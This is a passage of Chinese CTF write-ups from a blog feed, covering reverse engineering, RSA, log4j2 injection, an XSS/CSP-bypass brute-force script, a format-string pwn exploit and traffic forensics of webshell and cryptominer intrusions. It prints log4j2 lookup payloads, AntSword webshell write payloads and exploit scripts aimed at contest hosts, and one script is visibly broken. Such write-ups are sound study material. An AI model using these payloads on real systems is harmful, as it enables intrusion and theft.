<img src="https://img.hzy2003628.top/xxkpl0f3jt.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>调试的发现是存在r12，r13，r14，r15寄存器里了</p>
<img src="https://img.hzy2003628.top/ar7hepjr0m.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>再联想到生成的字节码里</p>
<img src="https://img.hzy2003628.top/cvox82uags.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>还有跳转的那个函数</p>
<img src="https://img.hzy2003628.top/xw6tbku3g5.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>脑洞一下</p>
<p>字节码里有数据，应该就是寄存器里的数据，应该就是flag的一部分（英文版的里ida也有灵感提示），看一下字节码的算法</p>
<p>写出exp</p>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
// Function to reverse a byte array in-place

void reverseBytes(uint8_t* bytes, size_t length) &#123;

for (size_t i = 0; i &lt; length / 2; i++) &#123;

uint8_t temp = bytes[i];

bytes[i] = bytes[length - i - 1];

bytes[length - i - 1] = temp;

&#125;

&#125;

int main() &#123;

uint64_t r12 = (2616514329260088143ULL ^ 1237891274917891239ULL) - 1892739;

uint64_t r13 = (8502251781212277489ULL ^ 1209847170981118947ULL) - 8971237;

uint64_t r14 = (2451795628338718684ULL ^ 1098791727398412397ULL) - 1512312;

uint64_t r15 = (8722213363631027234ULL ^ 1890878197237214971ULL) - 9123704;

// Reverse the bytes

reverseBytes((uint8_t*)&amp;r12, sizeof(r12));

reverseBytes((uint8_t*)&amp;r13, sizeof(r13));

reverseBytes((uint8_t*)&amp;r14, sizeof(r14));

reverseBytes((uint8_t*)&amp;r15, sizeof(r15));

uint8_t flag[37];

// Copy the bytes to the flag array

memcpy(flag, &quot;flag&#123;&quot;, 5);

memcpy(flag + 5, &amp;r12, sizeof(r12));

memcpy(flag + 5 + sizeof(r12), &amp;r13, sizeof(r13));

memcpy(flag + 5 + sizeof(r12) + sizeof(r13), &amp;r14, sizeof(r14));

memcpy(flag + 5 + sizeof(r12) + sizeof(r13) + sizeof(r14), &amp;r15, sizeof(r15));

memcpy(flag + 5 + sizeof(r12) + sizeof(r13) + sizeof(r14) + sizeof(r15), &quot;3861&#125;&quot;, 6);

printf(&quot;%s\n&quot;, flag);

return 0;

&#125;
//flag&#123;5bfe906ee4-e07e--96ca-49c69d13ca3861&#125;</code></pre>
<p>但是这个flag不对</p>
<p>跑出来的让我肯定这个算法不会出错，想到elf文件会不会是小端序存储，然后就又改了一下</p>
<p>Exp</p>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

#include &lt;stdint.h&gt;

#include &lt;string.h&gt;

// Function to reverse a byte array in-place

void reverseBytes(uint8_t* bytes, size_t length) &#123;

for (size_t i = 0; i &lt; length / 2; i++) &#123;

uint8_t temp = bytes[i];

bytes[i] = bytes[length - i - 1];

bytes[length - i - 1] = temp;

&#125;

&#125;

int main() &#123;

uint64_t r12 = (2616514329260088143ULL ^ 1237891274917891239ULL) - 1892739;

uint64_t r13 = (8502251781212277489ULL ^ 1209847170981118947ULL) - 8971237;

uint64_t r14 = (2451795628338718684ULL ^ 1098791727398412397ULL) - 1512312;

uint64_t r15 = (8722213363631027234ULL ^ 1890878197237214971ULL) - 9123704;

// Reverse the bytes

reverseBytes((uint8_t*)&amp;r12, sizeof(r12));

reverseBytes((uint8_t*)&amp;r13, sizeof(r13));

reverseBytes((uint8_t*)&amp;r14, sizeof(r14));

reverseBytes((uint8_t*)&amp;r15, sizeof(r15));

uint8_t flag[37];

// Copy the bytes to the flag array

memcpy(flag, &quot;flag&#123;&quot;, 5);

memcpy(flag + 5, &amp;r12, sizeof(r12));

memcpy(flag + 5 + sizeof(r12), &amp;r13, sizeof(r13));

memcpy(flag + 5 + sizeof(r12) + sizeof(r13), &amp;r14, sizeof(r14));

memcpy(flag + 5 + sizeof(r12) + sizeof(r13) + sizeof(r14), &amp;r15, sizeof(r15));

memcpy(flag + 5 + sizeof(r12) + sizeof(r13) + sizeof(r14) + sizeof(r15), &quot;3861&#125;&quot;, 6);

// Reverse each part inside the parentheses

reverseBytes(flag + 5, sizeof(r12));

reverseBytes(flag + 5 + sizeof(r12), sizeof(r13));

reverseBytes(flag + 5 + sizeof(r12) + sizeof(r13), sizeof(r14));

reverseBytes(flag + 5 + sizeof(r12) + sizeof(r13) + sizeof(r14), sizeof(r15));

printf(&quot;%s\n&quot;, flag);

return 0;

&#125;
// flag&#123;e609efb5-e70e-4e94-ac69-ac31d96c3861&#125;</code></pre>
<p>这个flag是对的</p>
<p>果然三分逆向七分猜</p>
<p>flag{e609efb5-e70e-4e94-ac69-ac31d96c3861}</p>
<h3 id="babyre">babyRE</h3>
<p>打开那个网页</p>
<img src="https://img.hzy2003628.top/f06xddv6t5.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>进入这个网站</p>
<p>找到锁图案里边的主要函数</p>
<img src="https://img.hzy2003628.top/k8w86km247.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>这个函数把输入的字符串中的每个值与上一个异或然后和secret这个列表进行对比</p>
<img src="https://img.hzy2003628.top/k4plyyoqmc.png" alt="请在此添加图片描述" style="zoom:200%;">
<img src="https://img.hzy2003628.top/10goqa6t9b.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>添加显示变量按钮来获得secret的值然后编写脚本</p>
<p>Exp</p>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

#include &lt;stdint.h&gt;

int main() &#123;

uint8_t secret[] = &#123;102, 10, 13, 6, 28, 74, 3, 1, 3, 7, 85, 0, 4, 75, 20, 92, 92, 8, 28, 25, 81, 83, 7, 28, 76, 88, 9, 0, 29, 73,

0, 86, 4, 87, 87, 82, 84, 85, 4, 85, 87, 30&#125;;

char flag[42] = &quot;f&quot;;

for (int i = 1; i &lt; 41; i++) &#123;

secret[i] = secret[i] ^ secret[i - 1];

flag[i] = secret[i];

&#125;

printf(&quot;%s&#125;\n&quot;, flag);

return 0;

&#125;</code></pre>
<p>运行后得flag</p>
<img src="https://img.hzy2003628.top/5oxchboiy3.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>Flag：flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第七届蓝帽杯半决赛</title>
    <url>/2023/09/17/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    <content><![CDATA[<img src="https://img.hzy2003628.top/image-20230916232950862.png" alt="image-20230916232950862" style="zoom:200%;">
<span id="more"></span>
<h1 id="ctf">CTF</h1>
<h2 id="crypto">Crypto</h2>
<h3 id="ezrsa">Ezrsa</h3>
<p>根据代码已知XY以及密文和n</p>
<p>Exp如下</p>
<pre><code class="hljs plaintext">from libnum import *
import math
import gmpy2
from Crypto.Util.number import inverse

a = 1
n = 161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823125490271091357244742345403096394500947202321339572876147277506789731024810289354756781901338337411136794489136638411531539112369520980466458615878975406339
x = 153801856029563198525204130558738800846256680799373350925981555360388985602786501362501554433635610131437376183630577217917787342621398264625389914280509
y = 8086061902465799210233863613232941060876437002894022994953293934963170056653232109405937694010696299303888742108631749969054117542816358078039478109426

 
b = -(2*y+x+1)
c = -n
ct =  15380535750650959213679345560658190067564859611922563753882617419201718847747207949211621591882732604480600745000879508274349808435529637573773711729853565120321608048340424321537282281161623712479117497156437792084977778826238039385697230676340978078264209760724043776058017336241110097549146883806481148999
d = gmpy2.isqrt(b * b - 4 * c)
d = int(d)
q = (-b+d)/2
p = n/q
d = inverse(65537, q - 1)
x=pow(ct,d,q)
print(n2s(x))</code></pre>
<img src="https://img.hzy2003628.top/image-20230917184734011.png" alt="image-20230917184734011" style="zoom:200%;">
<p>flag{2a5a9c6fe94da5ef7edeffebb506b29a}</p>
<h2 id="misc">MISC</h2>
<h3 id="签到题">签到题</h3>
<p>关注公众号得到flag</p>
<p>flag{Welcome_To_Blue_Hat_Cup}</p>
<h3 id="排队队吃果果">排队队吃果果</h3>
<p>Excel表格里面数字有加粗，根据题目，排队，按列升序之后加粗变黑，修改宽高得到二维码</p>
<img src="https://img.hzy2003628.top/clip_image004.jpg" alt="img" style="zoom:200%;">
<p>扫码得到flag</p>
<p>flag{35b6f3ed-9d28-93b8-e124-39f8ec3376b2}</p>
<h2 id="re">RE</h2>
<h3 id="justamat">justamat</h3>
<p>sub_476590函数拼接字符串</p>
<img src="https://img.hzy2003628.top/clip_image006.jpg" alt="img" style="zoom:200%;">
<p>比如输入”abcdefghijklmn”，经过两次sub_476590函数调用</p>
<pre><code class="hljs plaintext">s = &quot;abcdefghijklmn&quot;
ss = &quot;abcdefghijklmn_you_get_it&quot;
sss = &quot;there_are_a_lot_useless_information_but_oh.o0O_abcdefghijklmn_you_get_it&quot;</code></pre>
<p>然后把sss转为10*10的矩阵，传入sub_4051A0</p>
<p>sub_4051A0函数对矩阵做乘法，与已知的结果比较</p>
<img src="https://img.hzy2003628.top/clip_image008.jpg" alt="img" style="zoom:200%;">
<p>实际上，矩阵乘法的作用相当于X*A=B，其中X包含输入，解出X即可得到flag</p>
<pre><code class="hljs plaintext">import numpy as np
# X*A=B
A = [0xfe, 0xb, 0x1d, 0xf6, 0x83, 0xff, 0xe0, 0xb8, 0xdd, 0xb0, 0xc5, 0xde, 0xf6, 0x14, 0x9f, 0xdd, 0xd9, 0x7, 0x2d, 0x6b, 0x19, 0xca, 0x73, 0xfd, 0x87, 0x72, 0x24, 0x4, 0x49, 0x7e, 0xa9, 0xce, 0x91, 0xbe, 0x41, 0x18, 0x60, 0x3f, 0x2b, 0x63, 0x1c, 0xd2, 0x90, 0xe9, 0x8e, 0xba, 0x1e, 0xf3, 0x41, 0xad,
     0x2c, 0x3, 0x69, 0xda, 0x10, 0xfd, 0xfd, 0xe7, 0x6, 0x36, 0xd6, 0x2, 0x59, 0x18, 0xcc, 0x50, 0x87, 0xaf, 0xfb, 0x18, 0x44, 0x7f, 0xad, 0xf8, 0x2c, 0x67, 0x1d, 0x22, 0x84, 0xac, 0xe, 0x23, 0xdc, 0xe6, 0xbb, 0xd2, 0xb8, 0x4a, 0xbc, 0xde, 0x50, 0x9c, 0x1c, 0x1e, 0x86, 0x3a, 0x2d, 0xdd, 0xc3, 0x3]
B = [0x1c633, 0x1df94, 0x20ebf, 0x2ba40, 0x1e884, 0x260d1, 0x1f9b1, 0x1ea1a, 0x1eeaa, 0x1dfb2, 0x1c1d0, 0x1eef2, 0x216e1, 0x2be00, 0x1fb5e, 0x25d74, 0x1f000, 0x202d6, 0x20002, 0x1ddfe, 0x1c017, 0x1f08c, 0x227f6, 0x2c7ba, 0x201ae, 0x27fbf, 0x20e21, 0x1ff5c, 0x1fd62, 0x1e948, 0x1be6e, 0x1f4d7, 0x22c8d, 0x2c353, 0x1f8db, 0x26e1d, 0x1ff61, 0x1ea0f, 0x1f0d6, 0x1eda8, 0x1ad7d, 0x18218, 0x1ccd4, 0x239b6, 0x1ac4c, 0x20d7c, 0x1d967, 0x1a4f4, 0x1cad8, 0x196ae,
     0x1831b, 0x17e45, 0x1d0cf, 0x23edf, 0x181ae, 0x21760, 0x1d3b4, 0x175d6, 0x17d3a, 0x1994f, 0x1189d, 0x14ccf, 0x1568e, 0x17eeb, 0x1327e, 0x16a45, 0x12921, 0x11ff0, 0x13643, 0x11729, 0x15191, 0x17d17, 0x17262, 0x1a863, 0x17010, 0x17b10, 0x14f9c, 0x143e8, 0x15e9b, 0x1242c, 0xf68c, 0x1192a, 0x150ad, 0x1b1a0, 0x14c60, 0x182ab, 0x13f4b, 0x141a6, 0x15aa3, 0x135c9, 0x1d86f, 0x1e8fa, 0x2158d, 0x2bdac, 0x20e4f, 0x27ee6, 0x213b9, 0x20e86, 0x211ff, 0x1e1ef]
A_Mat = []
B_Mat = []
for i in range(0, 100, 10):
    tmp = A[i:i+10]
    A_Mat.append(tmp)
    tmp = B[i:i+10]
    B_Mat.append(tmp)
A_Mat = np.mat(A_Mat)
B_Mat = np.mat(B_Mat)
X_Mat = np.dot(B_Mat, np.linalg.inv(A_Mat))
for i in range(len(X_Mat)):
    tmp = X_Mat[i].tolist()[0]
    for j in range(len(tmp)):
        print(chr(round(tmp[j])), end=&quot;&quot;)
# there_are_a_lot_useless_information_but_oh.o0O_flag&#123;8f9c6cf7-f362-4a4e-ace2-a34d90939589&#125;_you_get_it</code></pre>
<p>所以flag为flag{8f9c6cf7-f362-4a4e-ace2-a34d90939589}</p>
<h2 id="web">WEB</h2>
<h3 id="mylinuxbot">MyLinuxBot</h3>
<p>根据题目描述，log4j2读环境变量</p>
<p>${java:${env}}</p>
<img src="https://img.hzy2003628.top/image-20230916233252881.png" alt="image-20230916233252881" style="zoom:200%;">
<p>直接读环境变量即可得到flag</p>
<p>${java:${env:FLAG}}</p>
<img src="https://img.hzy2003628.top/image-20230916233309817.png" alt="image-20230916233309817" style="zoom:200%;">
<p>flag{f3f5a58f-f117-40af-a58e-8462b38ea92b}</p>
<h3 id="airticleshare">AirticleShare</h3>
<p>这个是21年一个比赛的原题，简单改了一下不过做法没变</p>
<p><a href="https://www.freesion.com/article/3304518786/">https://www.freesion.com/article/3304518786/</a></p>
<p>每个用户都有独特的id</p>
<img src="https://img.hzy2003628.top/image-20230917184812217.png" alt="image-20230917184812217" style="zoom:200%;">
<p>打XSS获取admin的id之后得到flag，绕过CSP策略</p>
<p>Exp如下</p>
<pre><code class="hljs plaintext">import requests
import time
import sys

host = &#x27;112.74.185.213&#x27;
port = 46791
s = requests.Session()
base_url = f&quot;http://&#123;host&#125;:&#123;port&#125;//&quot;
res = s.get(base_url)
pos = res.text.find(&#x27;name=&quot;c&quot; value=&quot;&#x27;) + len(&#x27;name=&quot;c&quot; value=&quot;&#x27;)
csrftoken = res.text[pos:pos+16]

ss = &quot;0123456789abcdef&quot;
flag = &quot;&quot;

for i in range(16):
    for j in ss:
        print(&quot;trying&quot;,j)
        payload = f&#x27;&#x27;&#x27;&lt;form data-parsley-validate&gt;
                    &lt;input data-parsley-required
                    data-parsley-trigger=\&quot;blur\&quot;
                    data-parsley-error-message=\&quot;&lt;input type=button id=like&gt;\&quot;
                    data-parsley-errors-container=\&quot;a[href^=\&#x27;/lookup.php?id=&#123;flag + j&#125;\&#x27;]\&quot;
                    autofocus&gt;
                    &lt;/form&gt;&#x27;&#x27;&#x27;
        data = &#123;&#x27;c&#x27;: csrftoken, &#x27;content&#x27;: payload&#125;
        res = s.post(base_url + &quot;add.php&quot;, data=data, allow_redirects=False)
        # print(res.headers)
        location = res.headers[&#x27;Location&#x27;]
        pos = location.find(&#x27;id=&#x27;) + 3
        wp = location[pos:]
        data = &#123;&#x27;c&#x27;: csrftoken, &#x27;id&#x27;: wp&#125;
        res = s.post(base_url + &quot;admin.php&quot;, data=data)
        time.sleep(3)

        res = s.get(f&quot;http://&#123;host&#125;:&#123;port&#125;/lookup.php?id=&#123;wp&#125;&quot;)
        txt = res.text.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;)
        if &quot;Liked by&lt;/h3&gt;admin&quot; not in txt:
            flag += j
            print(i,flag)
            break
</code></pre>
<p>跑完之后获得admin的id，修改id，访问得到flag</p>
<img src="https://img.hzy2003628.top/image-20230917184829408.png" alt="image-20230917184829408" style="zoom:200%;">
<p>ctf{s1d3_ch4nn3l_attack_is_funny}</p>
<h2 id="pwn">Pwn</h2>
<h3 id="admin">Admin</h3>
<p>非预期,能获取管理员密码</p>
<img src="https://img.hzy2003628.top/image-20230916233427813.png" alt="image-20230916233427813" style="zoom:200%;">
<h3 id="uaf">Uaf</h3>
<p>审计代码发现格式化字符串漏洞</p>
<img src="https://img.hzy2003628.top/clip_image020.jpg" alt="img" style="zoom:200%;">
<p>并且能改写一个地址，然后程序就退出，</p>
<p>利用格式化字符串泄露出libc，然后打exit_hook为one_gadget</p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext">from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64
import gmpy2
li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)
ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)
def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def bug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))
def get_sb():
    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))

context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)
#p = process(&#x27;./pwn&#x27;)
p = remote(&#x27;120.78.172.238&#x27;, 43259)
elf = ELF(&#x27;./pwn&#x27;)
libc = ELF(&#x27;./libc-2.31.so&#x27;)
#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)

rl(&quot;&gt;&gt; \n&quot;)
sl(str(5))
rl(&quot;Passwd: &quot;)
s(str(1234567890))

rl(&quot;Tell me ur name: \n&quot;)
#bug()
sl(b&#x27;%19$p&#x27;)
#bug()
libc_base=int(p.recv(14),16)-libc.sym[&#x27;__libc_start_main&#x27;]-243
li(hex(libc_base))
exit_hook=libc_base+2020872
free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]
system=libc_base+libc.sym[&#x27;system&#x27;]
#exit_hook=libc_base+libc.sym[&#x27;rtld_lock_default_lock_recursive&#x27;]
one_gadget=libc_base+0xe6c7e
rl(&quot;&gt;&gt; \n&quot;)
sl(str(2))
li(hex(exit_hook))
rl(&quot;WRITE MODE: &quot;)
s(p64(malloc_hook))s
s(p64(one_gadget))

inter()</code></pre>
<h1 id="取证">取证</h1>
<p>取证WP</p>
<h2 id="1">1</h2>
<p>检材数据开始提取是今年09-11 17:21</p>
<p>看日志得到答案</p>
<img src="https://img.hzy2003628.top/clip_image001.png" alt="img" style="zoom:200%;">
<h2 id="2">2</h2>
<p>嫌疑人手机SD卡存储空间一共24.32 GB</p>
<img src="https://img.hzy2003628.top/image-20230916233729511.png" alt="image-20230916233729511" style="zoom:200%;">
<h2 id="3">3</h2>
<p>手机名称为sailfish</p>
<img src="https://img.hzy2003628.top/image-20230916233740525.png" alt="image-20230916233740525" style="zoom:200%;">
<h2 id="4">4</h2>
<p>同图三</p>
<p>嫌疑人手机IMEI是352531082716257</p>
<h2 id="5">5</h2>
<p>嫌疑人手机通讯录数据存放在contacts.db</p>
<img src="https://img.hzy2003628.top/image-20230916233800330.png" alt="image-20230916233800330" style="zoom:200%;">
<h2 id="7">7</h2>
<p>测试apk的包名是com.example.myapplication</p>
<img src="https://img.hzy2003628.top/image-20230916233818644.png" alt="image-20230916233818644" style="zoom:200%;">
<h2 id="8">8</h2>
<p>测试apk的签名算法是SHA256withRSA</p>
<p>找到对应测试apk，反编译查看加密算法得到答案</p>
<img src="https://img.hzy2003628.top/image-20230916233838496.png" alt="image-20230916233838496" style="zoom:200%;">
<h2 id="10">10</h2>
<p>测试apk一共申请了3个权限</p>
<p>在线摸瓜工具分析APK得到答案</p>
<img src="https://img.hzy2003628.top/image-20230916233853323.png" alt="image-20230916233853323" style="zoom:200%;">
<h2 id="11">11</h2>
<p>测试apk对Calllog.txt文件内的数据进行了Base64加密</p>
<img src="https://img.hzy2003628.top/image-20230916233919623.png" alt="image-20230916233919623" style="zoom:200%;">
<h2 id="12">12</h2>
<p>10086对嫌疑人拨打过2次电话</p>
<img src="https://img.hzy2003628.top/image-20230916233934950.png" alt="image-20230916233934950" style="zoom:200%;">
<h2 id="14">14</h2>
<p>测试apk对短信记录进行加密的秘钥是bGlqdWJkeWhmdXJp</p>
<p>So文件分析</p>
<img src="https://img.hzy2003628.top/image-20230916233948880.png" alt="image-20230916233948880" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230916234006928.png" alt="image-20230916234006928" style="zoom:200%;">
<h2 id="15">15</h2>
<p>嫌疑人在2021年登录支付宝的验证码是9250</p>
<img src="https://img.hzy2003628.top/image-20230916234022292.png" alt="image-20230916234022292" style="zoom:200%;">]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023陇剑杯</title>
    <url>/2023/08/27/2023%E9%99%87%E5%89%91%E6%9D%AF/</url>
    <content><![CDATA[<img src="https://img.hzy2003628.top/image-20230827133524905.png" alt="image-20230827133524905" style="zoom:200%;">
<span id="more"></span>
<h1 id="ssw">SSW</h1>
<p>SmallSword_1</p>
<p>导出HTTP对象的时候发现有sql注入的语句，猜测攻击手法是sql注入</p>
<img src="https://img.hzy2003628.top/image-20230827140152396.png" alt="image-20230827140152396" style="zoom:200%;">
<p>在这里发现了可疑的php文件</p>
<img src="https://img.hzy2003628.top/image-20230827140211607.png" alt="image-20230827140211607" style="zoom:200%;">
<p>追踪15340发现可控参数，也就是连接密码</p>
<img src="https://img.hzy2003628.top/image-20230827140234402.png" alt="image-20230827140234402" style="zoom:200%;">
<p>Flag：flag{0898e404bfabd0ebb702327b19f}</p>
<h2 id="smallsword_2">SmallSword_2</h2>
<p>知道攻击手法，因为蚁剑连接的方式是POST</p>
<p>所以直接用语法搜索</p>
<p>http.request.method == “POST”</p>
<p>在24393组发现了base64加密的字符串</p>
<img src="https://img.hzy2003628.top/image-20230827140319456.png" alt="image-20230827140319456" style="zoom:200%;">
<p>Base64解码之后，发现有hacker.txt字样</p>
<img src="https://img.hzy2003628.top/image-20230827140334973.png" alt="image-20230827140334973" style="zoom:200%;">
<p>深入追踪此条流量，将下列部分进行url和base64解码</p>
<p><img src="https://img.hzy2003628.top/image-20230827140351687.png" alt="image-20230827140351687"></p>
<pre><code class="hljs plaintext">0x72b3f341e432=D:/phpStudy/PHPTutorial/WWW/sqlii/Less-7/hacker.txt&amp;0xe9bb136e8a5e9=HaloANT!&amp;6ea280898e404bfabd0ebb702327b19f=@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);echo &quot;-&gt;|&quot;;echo@fwrite(fopen(base64_decode($_POST[&quot;0x72b3f341e432&quot;]),&quot;w&quot;),base64_decode($_POST[&quot;0xe9bb136e8a5e9&quot;]))?&quot;1&quot;:&quot;0&quot;;;echo &quot;|&lt;-&quot;;die();</code></pre>
<p>发现这是默认的创建文件的流量，而且文件内容默认为HaloANT!</p>
<p>接着往下进行流量分析</p>
<p>在24475组找到了与之对应的流量</p>
<img src="https://img.hzy2003628.top/image-20230827140436677.png" alt="image-20230827140436677" style="zoom:200%;">
<p>追踪流量</p>
<img src="https://img.hzy2003628.top/image-20230827140453715.png" alt="image-20230827140453715" style="zoom:200%;">
<p>解密之后得到</p>
<pre><code class="hljs plaintext">0x72b3f341e432=D:/phpStudy/PHPTutorial/WWW/sqlii/Less-7/hacker.txt&amp;0xe9bb136e8a5e9=ad6269b7-3ce2-4ae8-b97f-f259515e7a91&amp;6ea280898e404bfabd0ebb702327b19f=@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);echo&quot;-&gt;|&quot;;echo@fwrite(fopen(base64_decode($_POST[&quot;0x72b3f341e432&quot;]),&quot;w&quot;),base64_decode($_POST[&quot;0xe9bb136e8a5e9&quot;]))?&quot;1&quot;:&quot;0&quot;;;echo &quot;|&lt;-&quot;;die();</code></pre>
<p>可以看到此处写入的内容是</p>
<p>ad6269b7-3ce2-4ae8-b97f-f259515e7a91</p>
<p>所以flag为 flag{ad6269b7-3ce2-4ae8-b97f-f259515e7a91}</p>
<h2 id="smallsword_3">SmallSword_3</h2>
<p>在16564组中发现了一个程序为huorong.exe</p>
<img src="https://img.hzy2003628.top/image-20230827140514544.png" alt="image-20230827140514544" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230827140529325.png" alt="image-20230827140529325" style="zoom:200%;">
<p>接下来将追踪到的exe下载到本地</p>
<img src="https://img.hzy2003628.top/image-20230827140558658.png" alt="image-20230827140558658" style="zoom:200%;">
<p>将所有内容复制放入010，因为exe文件头是4D5A，所以需要将前面的数字去掉</p>
<img src="https://img.hzy2003628.top/image-20230827140727822.png" alt="image-20230827140727822" style="zoom:200%;">
<p>运行之后得到一张名为test.jpg的图片</p>
<img src="https://img.hzy2003628.top/image-20230827140744296.png" alt="image-20230827140744296" style="zoom:200%;">
<p>发现图片的长宽有问题，拉到010里面发现是张png图片</p>
<p>对crc值进行脚本爆破</p>
<pre><code class="hljs plaintext">import os
import binascii
import struct

for i in range(20000):#一般 20000就够
    wide = struct.pack(&#x27;&gt;i&#x27;,i)
    for j in range(20000):
        high = struct.pack(&#x27;&gt;i&#x27;,j)
        data = b&#x27;\x49\x48\x44\x52&#x27; + wide+ high+b&#x27;\x08\x02\x00\x00\x00&#x27;
        #因为是 Py3，byte和str型不能直接进行运算，要写把 str写 b&#x27;...&#x27;。不然把 wide和 high写成 str(...)

        crc32 = binascii.crc32(data) &amp; 0xffffffff
        if crc32 == 0x5ADB9644:  # 0x889C2F07是这个 png文件头的 CRC校验码，在 21~25byte处
            print(&#x27;\n\n&#x27;,i,j,crc32)   #0x 后的数字为十六进制中crc位置的代码（winhex左016，13-下一行的0）
            print(type(data))
            exit(0)
    print(i,end=&#x27; &#x27;)</code></pre>
<p>运行得到结果</p>
<img src="https://img.hzy2003628.top/image-20230827140906421.png" alt="image-20230827140906421" style="zoom:200%;">
<p>进行16进制转换，得到301</p>
<img src="https://img.hzy2003628.top/image-20230827140920642.png" alt="image-20230827140920642" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230827140935514.png" alt="image-20230827140935514" style="zoom:200%;">
<p>得到flag：flag{8f0dffac-5801-44a9-bd49-e66192ce4f57}</p>
<h1 id="ws">WS</h1>
<h2 id="wireshark1_1">Wireshark1_1</h2>
<p>过滤第一个tcp流量，发现Destination是VMware虚拟机</p>
<img src="https://img.hzy2003628.top/image-20230827140959547.png" alt="image-20230827140959547" style="zoom:200%;">
<p>其ip为192.168.246.28</p>
<p>Flag：flag{192.168.246.28}</p>
<h2 id="wireshark1_2">Wireshark1_2</h2>
<p>对tcp流量进行追踪，找到了被入侵主机的账户和密码</p>
<img src="https://img.hzy2003628.top/image-20230827141016742.png" alt="image-20230827141016742" style="zoom:200%;">
<p>所以口令是youcannevergetthis</p>
<p>Flag：flag{youcannevergetthis}</p>
<h2 id="wireshark1_3">Wireshark1_3</h2>
<p>追踪tcp流，找到了ls的命令，发现用户目录下第二个文件夹是Downloads</p>
<img src="https://img.hzy2003628.top/image-20230827141035296.png" alt="image-20230827141035296" style="zoom:200%;">
<p>Flag：flag{Downloads}</p>
<h2 id="wireshark1_4">Wireshark1_4</h2>
<p>在 ccaatt //eettcc//ppaasswwdd命令下面找到倒数第二个用户的用户名为mysql</p>
<img src="https://img.hzy2003628.top/image-20230827141050458.png" alt="image-20230827141050458" style="zoom:200%;">
<p>Flag：flag{mysql}</p>
<h1 id="ss">SS</h1>
<h2 id="sevrer-save_1">sevrer save_1</h2>
<img src="https://img.hzy2003628.top/image-20230827141104797.png" alt="image-20230827141104797" style="zoom:200%;">
<p>直接跟踪这个流，找到spring的特征poc</p>
<img src="https://img.hzy2003628.top/image-20230827141128728.png" alt="image-20230827141128728" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230827141145357.png" alt="image-20230827141145357" style="zoom:200%;">
<p>所以flag是CVE-2022-22965</p>
<h2 id="sevrer-save_2">sevrer save_2</h2>
<p>跟踪流得到flag</p>
<img src="https://img.hzy2003628.top/image-20230827141201672.png" alt="image-20230827141201672" style="zoom:200%;">
<p>192.168.43.128:2333</p>
<h2 id="sevrer-save_3">sevrer save_3</h2>
<p>解压do压缩包，home文件夹得到一个程序</p>
<img src="https://img.hzy2003628.top/image-20230827141215842.png" alt="image-20230827141215842" style="zoom:200%;">
<p>所以flag为main</p>
<h2 id="sevrer-save_4">sevrer save_4</h2>
<p>IDA分析main病毒文件，反编译，猜测搜关键字符串passwd</p>
<img src="https://img.hzy2003628.top/image-20230827141238339.png" alt="image-20230827141238339" style="zoom:200%;">
<p>跟进得到用户和密码</p>
<img src="https://img.hzy2003628.top/image-20230827141256095.png" alt="image-20230827141256095" style="zoom:200%;">
<p>ll:123456</p>
<h2 id="sevrer-save_5">sevrer save_5</h2>
<p>直接查看日志.log.txt得到外网IP</p>
<img src="https://img.hzy2003628.top/image-20230827141311672.png" alt="image-20230827141311672" style="zoom:200%;">
<p>172.105.202.239</p>
<h2 id="sevrer-save_6">sevrer save_6</h2>
<p>猜测.idea里面的文件就是释放文件</p>
<img src="https://img.hzy2003628.top/image-20230827141331963.png" alt="image-20230827141331963" style="zoom:200%;">
<p>lolMiner,mine_doge.sh</p>
<h2 id="sevrer-save_7">sevrer save_7</h2>
<p>查看mine_doge.sh得到矿池地址</p>
<img src="https://img.hzy2003628.top/image-20230827141344735.png" alt="image-20230827141344735" style="zoom:200%;">
<p><a href="http://doge.millpools.cc:5567">doge.millpools.cc:5567</a></p>
<h2 id="sevrer-save_8">sevrer save_8</h2>
<p>同上，得到钱包地址</p>
